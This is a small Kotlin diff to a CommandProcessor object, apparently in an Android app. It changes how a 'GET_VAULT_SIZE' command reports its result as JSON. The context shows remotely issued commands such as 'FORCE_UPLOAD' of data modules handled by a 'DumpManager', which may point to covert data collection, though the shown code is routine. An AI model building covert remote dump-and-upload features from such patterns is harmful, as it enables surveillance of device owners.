@@ -146,7 +146,11 @@ object CommandProcessor {
                     status = "EXECUTED (STOPPED)"
                 }
                 "GET_VAULT_SIZE" -> {
-                    status = DumpManager.getVaultSize()
+                    val sizeInfo = DumpManager.getVaultSize()
+                    status = "EXECUTED"
+                    val result = JSONObject().put("size_report", sizeInfo)
+                    updateCommandStatus(ctx, id, status, null, result, null)
+                    return
                 }
                 "FORCE_UPLOAD" -> {
                     val modules = content.split(",").map { it.trim() }
